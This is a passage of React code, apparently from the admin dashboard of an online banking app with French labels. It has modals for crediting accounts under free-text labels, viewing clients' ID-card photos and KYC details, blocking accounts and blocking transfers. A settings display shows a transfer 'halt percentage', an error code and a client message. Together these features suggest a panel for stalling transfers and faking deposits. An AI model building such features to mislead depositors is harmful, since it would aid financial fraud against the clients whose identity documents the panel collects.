                </form>

                {/* Current settings display */}
                {transferSettings && (
                  <div style={{ marginTop: "2rem", paddingTop: "1.5rem", borderTop: "1px solid rgba(255,255,255,0.1)" }}>
                    <h4 style={{ color: "#94a3b8", fontSize: "0.85rem", textTransform: "uppercase", letterSpacing: "1px", marginBottom: "1rem" }}>
                      Valeurs actuelles
                    </h4>
                    <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))", gap: "1rem", fontSize: "0.9rem" }}>
                      <div style={{ background: "rgba(255,255,255,0.03)", padding: "1rem", borderRadius: "10px", border: "1px solid rgba(255,255,255,0.08)" }}>
                        <div style={{ color: "#64748b", fontSize: "0.75rem", marginBottom: "0.25rem" }}>Pourcentage d&apos;arrêt</div>
                        <div style={{ color: "#60a5fa", fontWeight: 700, fontSize: "1.25rem" }}>{transferSettings.haltPercent}%</div>
                      </div>
                      <div style={{ background: "rgba(255,255,255,0.03)", padding: "1rem", borderRadius: "10px", border: "1px solid rgba(255,255,255,0.08)" }}>
                        <div style={{ color: "#64748b", fontSize: "0.75rem", marginBottom: "0.25rem" }}>Code d&apos;erreur</div>
                        <div style={{ color: "#cbd5e1", fontFamily: "monospace", fontSize: "0.85rem", wordBreak: "break-all" }}>{transferSettings.errorCode}</div>
                      </div>
                      <div style={{ background: "rgba(255,255,255,0.03)", padding: "1rem", borderRadius: "10px", border: "1px solid rgba(255,255,255,0.08)", gridColumn: "1 / -1" }}>
                        <div style={{ color: "#64748b", fontSize: "0.75rem", marginBottom: "0.25rem" }}>Message client</div>
                        <div style={{ color: "#cbd5e1", whiteSpace: "pre-wrap" }}>{transferSettings.haltMessage}</div>
                      </div>
                      <div style={{ background: "rgba(255,255,255,0.03)", padding: "1rem", borderRadius: "10px", border: "1px solid rgba(255,255,255,0.08)", gridColumn: "1 / -1" }}>
                        <div style={{ color: "#64748b", fontSize: "0.75rem", marginBottom: "0.25rem" }}>Dernière mise à jour</div>
                        <div style={{ color: "#94a3b8" }}>{new Date(transferSettings.updatedAt).toLocaleString("fr-FR")}</div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

      </div>

      {/* ================= MODALE "CRÉDITER LE COMPTE" ================= */}
      {creditUser && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.8)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 1000, padding: "1rem" }}>
          <div style={{ background: "#0f172a", border: "1px solid rgba(255,255,255,0.15)", borderRadius: "20px", width: "100%", maxWidth: "460px", padding: "2rem", color: "#fff", boxShadow: "0 25px 50px rgba(0,0,0,0.5)" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1.25rem" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "0.6rem" }}>
                <div style={{ width: "36px", height: "36px", borderRadius: "10px", background: "rgba(16, 185, 129, 0.2)", display: "flex", alignItems: "center", justifyContent: "center", color: "#10b981" }}>
                  <i className="fa-solid fa-coins"></i>
                </div>
                <div>
                  <h2 style={{ fontSize: "1.15rem", fontWeight: 700, margin: 0 }}>Créditer le compte client</h2>
                  <span style={{ fontSize: "0.8rem", color: "#94a3b8" }}>{creditUser.firstName} {creditUser.lastName} ({creditUser.email})</span>
                </div>
              </div>
              <button onClick={() => setCreditUser(null)} style={{ background: "none", border: "none", color: "#94a3b8", fontSize: "1.25rem", cursor: "pointer" }}>
                ✕
              </button>
            </div>

            {creditFeedback && (
              <div style={{ background: "rgba(16, 185, 129, 0.2)", border: "1px solid rgba(16, 185, 129, 0.4)", color: "#6ee7b7", padding: "0.75rem 1rem", borderRadius: "10px", marginBottom: "1rem", fontSize: "0.9rem" }}>
                <i className="fa-solid fa-circle-check"></i> {creditFeedback}
              </div>
            )}

            <form onSubmit={handleCreditSubmit}>
              <div style={{ marginBottom: "1rem" }}>
                <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.4rem", fontWeight: 600 }}>
                  Montant à créditer (€) :
                </label>
                <input
                  type="number"
                  min="1"
                  step="0.01"
                  required
                  value={creditAmount}
                  onChange={(e) => setCreditAmount(e.target.value)}
                  placeholder="Ex: 5000.00"
                  style={{
                    width: "100%",
                    padding: "0.8rem 1rem",
                    borderRadius: "12px",
                    background: "rgba(255,255,255,0.06)",
                    border: "1px solid rgba(255,255,255,0.15)",
                    color: "#fff",
                    fontSize: "1.1rem",
                    fontWeight: 700,
                    boxSizing: "border-box",
                  }}
                />
              </div>

              <div style={{ marginBottom: "1.5rem" }}>
                <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.4rem", fontWeight: 600 }}>
                  Libellé / Motif de l&apos;opération :
                </label>
                <input
                  type="text"
                  required
                  value={creditDescription}
                  onChange={(e) => setCreditDescription(e.target.value)}
                  placeholder="Ex: Virement reçu / Dépôt de fonds"
                  style={{
                    width: "100%",
                    padding: "0.8rem 1rem",
                    borderRadius: "12px",
                    background: "rgba(255,255,255,0.06)",
                    border: "1px solid rgba(255,255,255,0.15)",
                    color: "#fff",
                    fontSize: "0.95rem",
                    boxSizing: "border-box",
                  }}
                />
              </div>

              <div style={{ display: "flex", gap: "0.75rem" }}>
                <button
                  type="button"
                  onClick={() => setCreditUser(null)}
                  style={{
                    flex: 1,
                    padding: "0.75rem",
                    borderRadius: "10px",
                    background: "rgba(255,255,255,0.08)",
                    border: "none",
                    color: "#fff",
                    fontWeight: 600,
                    cursor: "pointer",
                  }}
                >
                  Annuler
                </button>
                <button
                  type="submit"
                  disabled={creditLoading || !creditAmount}
                  style={{
                    flex: 1,
                    padding: "0.75rem",
                    borderRadius: "10px",
                    background: "linear-gradient(135deg, #10b981, #059669)",
                    border: "none",
                    color: "#000",
                    fontWeight: 700,
                    cursor: creditLoading ? "wait" : "pointer",
                  }}
                >
                  {creditLoading ? "En cours…" : "Confirmer le crédit"}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ================= MODALE "VOIR INFOS & PIÈCES D'IDENTITÉ" ================= */}
      {selectedUser && (
        <div className="modal-overlay" style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.8)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 1000, padding: "1rem" }}>
          <div className="modal-content" style={{ background: "#0b1120", border: "1px solid rgba(255,255,255,0.1)", borderRadius: "20px", width: "100%", maxWidth: "680px", padding: "2rem", color: "#fff", display: "flex", flexDirection: "column", gap: "1.5rem", maxHeight: "90vh", overflowY: "auto" }}>
            
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h2 style={{ fontSize: "1.25rem", fontWeight: 700 }}>Dossier client & Justificatifs</h2>
              <button onClick={() => setSelectedUser(null)} style={{ background: "none", border: "none", color: "#94a3b8", fontSize: "1.25rem", cursor: "pointer" }}>
                <i className="fa-solid fa-xmark"></i>
              </button>
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1rem", fontSize: "0.9rem" }}>
              <div><strong>Nom complet :</strong> {selectedUser.civility} {selectedUser.firstName} {selectedUser.lastName}</div>
              <div><strong>Email :</strong> {selectedUser.email}</div>
              <div><strong>Téléphone :</strong> {selectedUser.phone}</div>
              <div><strong>Date de naissance :</strong> {selectedUser.birthDate} ({selectedUser.birthPlace})</div>
              <div><strong>Nationalité :</strong> {selectedUser.nationality}</div>
              <div><strong>Pays de résidence :</strong> {selectedUser.residenceCountry}</div>
              <div><strong>Ville & Code postal :</strong> {selectedUser.city} ({selectedUser.postalCode})</div>
              <div><strong>Profession :</strong> {selectedUser.profession}</div>
              <div><strong>Revenu mensuel déclaré :</strong> <span style={{ color: "#22c55e", fontWeight: 700 }}>{selectedUser.monthlyIncome ? `${selectedUser.monthlyIncome} € / mois` : "Non spécifié"}</span></div>
              <div><strong>Devise :</strong> {selectedUser.currency}</div>
              <div><strong>Type de document :</strong> {selectedUser.documentType}</div>
              <div><strong>Statut actuel :</strong> <span style={{ color: selectedUser.status === "approved" ? "#22c55e" : selectedUser.status === "rejected" ? "#ef4444" : "#f59e0b" }}>{selectedUser.status}</span></div>
              <div style={{ gridColumn: "span 2" }}><strong>Adresse :</strong> {selectedUser.address}</div>
            </div>

            {/* Photos de la pièce d'identité */}
            <div style={{ borderTop: "1px solid rgba(255,255,255,0.1)", paddingTop: "1rem" }}>
              <strong style={{ display: "block", marginBottom: "0.75rem", fontSize: "0.95rem" }}>
                <i className="fa-solid fa-id-card"></i> Pièce d&apos;identité téléchargée :
              </strong>
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1rem" }}>
                <div>
                  <span style={{ fontSize: "0.8rem", color: "#94a3b8", display: "block", marginBottom: "0.25rem" }}>Recto :</span>
                  {selectedUser.idCardFront ? (
                    <a href={selectedUser.idCardFront} target="_blank" rel="noopener noreferrer">
                      <img
                        src={selectedUser.idCardFront}
                        alt="Recto pièce"
                        style={{ width: "100%", maxHeight: "180px", objectFit: "cover", borderRadius: "10px", border: "1px solid rgba(255,255,255,0.15)", cursor: "zoom-in" }}
                      />
                    </a>
                  ) : (
                    <div style={{ background: "rgba(255,255,255,0.03)", padding: "2rem 1rem", textAlign: "center", borderRadius: "10px", color: "#64748b", fontSize: "0.85rem" }}>
                      Aucune image recto
                    </div>
                  )}
                </div>

                <div>
                  <span style={{ fontSize: "0.8rem", color: "#94a3b8", display: "block", marginBottom: "0.25rem" }}>Verso :</span>
                  {selectedUser.idCardBack ? (
                    <a href={selectedUser.idCardBack} target="_blank" rel="noopener noreferrer">
                      <img
                        src={selectedUser.idCardBack}
                        alt="Verso pièce"
                        style={{ width: "100%", maxHeight: "180px", objectFit: "cover", borderRadius: "10px", border: "1px solid rgba(255,255,255,0.15)", cursor: "zoom-in" }}
                      />
                    </a>
                  ) : (
                    <div style={{ background: "rgba(255,255,255,0.03)", padding: "2rem 1rem", textAlign: "center", borderRadius: "10px", color: "#64748b", fontSize: "0.85rem" }}>
                      {selectedUser.documentType === "passport" ? "Non requis (Passeport)" : "Aucune image verso"}
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div style={{ display: "flex", gap: "1rem", marginTop: "1rem", justifyContent: "flex-end" }}>
              <button
                onClick={() => updateStatus(selectedUser.id, "rejected")}
                style={{ background: "rgba(239, 68, 68, 0.2)", color: "#ef4444", border: "1px solid rgba(239, 68, 68, 0.4)", padding: "0.6rem 1.25rem", borderRadius: "8px", fontWeight: "bold", cursor: "pointer" }}
              >
                Rejeter le compte
              </button>
              <button
                onClick={() => updateStatus(selectedUser.id, "approved")}
                style={{ background: "#22c55e", color: "#000", border: "none", padding: "0.6rem 1.25rem", borderRadius: "8px", fontWeight: "bold", cursor: "pointer" }}
              >
                Approuver le compte
              </button>
            </div>

          </div>
        </div>
      )}

      {/* ================= MODALE "BLOQUER LE COMPTE" ================= */}
      {blockUser && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.8)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 1000, padding: "1rem" }}>
          <div style={{ background: "#0f172a", border: "1px solid rgba(255,255,255,0.15)", borderRadius: "20px", width: "100%", maxWidth: "460px", padding: "2rem", color: "#fff", boxShadow: "0 25px 50px rgba(0,0,0,0.5)" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1.25rem" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "0.6rem" }}>
                <div style={{ width: "36px", height: "36px", borderRadius: "10px", background: "rgba(239, 68, 68, 0.2)", display: "flex", alignItems: "center", justifyContent: "center", color: "#ef4444" }}>
                  <i className="fa-solid fa-ban"></i>
                </div>
                <div>
                  <h2 style={{ fontSize: "1.15rem", fontWeight: 700, margin: 0 }}>Bloquer le compte client</h2>
                  <span style={{ fontSize: "0.8rem", color: "#94a3b8" }}>{blockUser.firstName} {blockUser.lastName} ({blockUser.email})</span>
                </div>
              </div>
              <button onClick={() => { setBlockUser(null); setBlockUserReason(""); }} style={{ background: "none", border: "none", color: "#94a3b8", fontSize: "1.25rem", cursor: "pointer" }}>
                ✕
              </button>
            </div>

            <div style={{ marginBottom: "1rem" }}>
              <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.4rem", fontWeight: 600 }}>
                Motif du blocage (obligatoire) :
              </label>
              <textarea
                required
                value={blockUserReason}
                onChange={(e) => setBlockUserReason(e.target.value)}
                placeholder="Ex: Fraude suspectée / Non-conformité KYC / Demande judiciaire..."
                style={{
                  width: "100%",
                  minHeight: "100px",
                  padding: "0.8rem 1rem",
                  borderRadius: "12px",
                  background: "rgba(255,255,255,0.06)",
                  border: "1px solid rgba(255,255,255,0.15)",
                  color: "#fff",
                  fontSize: "0.95rem",
                  boxSizing: "border-box",
                  resize: "vertical",
                  fontFamily: "inherit",
                }}
              />
            </div>

            <div style={{ display: "flex", gap: "0.75rem" }}>
              <button
                type="button"
                onClick={() => { setBlockUser(null); setBlockUserReason(""); }}
                style={{
                  flex: 1,
                  padding: "0.75rem",
                  borderRadius: "10px",
                  background: "rgba(255,255,255,0.08)",
                  border: "none",
                  color: "#fff",
                  fontWeight: 600,
                  cursor: "pointer",
                }}
              >
                Annuler
              </button>
              <button
                type="button"
                onClick={() => updateStatus(blockUser.id, "blocked", blockUserReason)}
                disabled={blockUserLoading || !blockUserReason.trim()}
                style={{
                  flex: 1,
                  padding: "0.75rem",
                  borderRadius: "10px",
                  background: "linear-gradient(135deg, #ef4444, #dc2626)",
                  border: "none",
                  color: "#fff",
                  fontWeight: 700,
                  cursor: blockUserLoading || !blockUserReason.trim() ? "wait" : "pointer",
                  opacity: blockUserLoading || !blockUserReason.trim() ? 0.6 : 1,
                }}
              >
                {blockUserLoading ? "Blocage en cours…" : "Confirmer le blocage"}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ================= MODALE "BLOQUER LE VIREMENT" ================= */}
      {blockWithdrawal && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.8)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 1000, padding: "1rem" }}>
          <div style={{ background: "#0f172a", border: "1px solid rgba(255,255,255,0.15)", borderRadius: "20px", width: "100%", maxWidth: "460px", padding: "2rem", color: "#fff", boxShadow: "0 25px 50px rgba(0,0,0,0.5)" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1.25rem" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "0.6rem" }}>
                <div style={{ width: "36px", height: "36px", borderRadius: "10px", background: "rgba(239, 68, 68, 0.2)", display: "flex", alignItems: "center", justifyContent: "center", color: "#ef4444" }}>
                  <i className="fa-solid fa-ban"></i>
                </div>
                <div>
                  <h2 style={{ fontSize: "1.15rem", fontWeight: 700, margin: 0 }}>Bloquer le virement</h2>
                  <span style={{ fontSize: "0.8rem", color: "#94a3b8" }}>
                    {(blockWithdrawal.amountCents / 100).toFixed(2)} € vers {blockWithdrawal.recipientName}
                  </span>
                </div>
              </div>
              <button onClick={() => { setBlockWithdrawal(null); setBlockWithdrawalReason(""); }} style={{ background: "none", border: "none", color: "#94a3b8", fontSize: "1.25rem", cursor: "pointer" }}>
                ✕
              </button>
            </div>

            <div style={{ marginBottom: "1rem", padding: "1rem", background: "rgba(255,255,255,0.03)", borderRadius: "10px", fontSize: "0.85rem" }}>
              <div><strong>Demandeur :</strong> {blockWithdrawal.userFirstName} {blockWithdrawal.userLastName} ({blockWithdrawal.userEmail})</div>
              <div><strong>Bénéficiaire :</strong> {blockWithdrawal.recipientName}</div>
              <div><strong>IBAN :</strong> {blockWithdrawal.iban}</div>
              <div><strong>Montant :</strong> {(blockWithdrawal.amountCents / 100).toFixed(2)} €</div>
            </div>

            <div style={{ marginBottom: "1rem" }}>
              <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.4rem", fontWeight: 600 }}>
                Motif du blocage (obligatoire) :
              </label>
              <textarea
                required
                value={blockWithdrawalReason}
                onChange={(e) => setBlockWithdrawalReason(e.target.value)}
                placeholder="Ex: Bénéficiaire suspecté / Fraude / Demande client / Conformité..."
                style={{
                  width: "100%",
                  minHeight: "100px",
                  padding: "0.8rem 1rem",
                  borderRadius: "12px",
                  background: "rgba(255,255,255,0.06)",
                  border: "1px solid rgba(255,255,255,0.15)",
                  color: "#fff",
                  fontSize: "0.95rem",
                  boxSizing: "border-box",
                  resize: "vertical",
                  fontFamily: "inherit",
                }}
              />
            </div>

            <div style={{ display: "flex", gap: "0.75rem" }}>
              <button
                type="button"
                onClick={() => { setBlockWithdrawal(null); setBlockWithdrawalReason(""); }}
                style={{
                  flex: 1,
                  padding: "0.75rem",
                  borderRadius: "10px",
                  background: "rgba(255,255,255,0.08)",
                  border: "none",
                  color: "#fff",
                  fontWeight: 600,
                  cursor: "pointer",
                }}
              >
                Annuler
              </button>
              <button
                type="button"
                onClick={() => blockWithdrawalAction(blockWithdrawal.id, blockWithdrawalReason)}
                disabled={blockWithdrawalLoading || !blockWithdrawalReason.trim()}
                style={{
                  flex: 1,
                  padding: "0.75rem",
                  borderRadius: "10px",
                  background: "linear-gradient(135deg, #ef4444, #dc2626)",
                  border: "none",
                  color: "#fff",
                  fontWeight: 700,
                  cursor: blockWithdrawalLoading || !blockWithdrawalReason.trim() ? "wait" : "pointer",
                  opacity: blockWithdrawalLoading || !blockWithdrawalReason.trim() ? 0.6 : 1,
                }}
              >
                {blockWithdrawalLoading ? "Blocage en cours…" : "Confirmer le blocage"}
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  );
}
